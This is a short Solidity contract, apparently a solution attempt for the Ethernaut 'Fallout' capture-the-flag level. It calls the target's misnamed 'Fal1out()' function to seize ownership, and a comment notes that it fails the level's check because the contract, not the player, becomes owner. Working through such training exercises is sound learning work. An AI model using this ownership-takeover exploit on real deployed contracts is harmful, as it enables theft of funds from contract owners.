pragma solidity ^0.5.0;

contract FallOutHack {
    /**
     * @title FallOutHack.
     * @dev This will successfully hack the Fallback contract but won't be able the pass the test. 
     * Ethernaut requires PLAYER address to be owner not the deployed smart contract address. 
     * Deposit some ether before executing.
    */
    function deposit() external payable {}

    function constructorMistake(address _a) public {
        bytes memory payload = abi.encodeWithSignature("Fal1out()");
        (bool success, ) = address(_a).call(payload);
        require(success);
    }

}
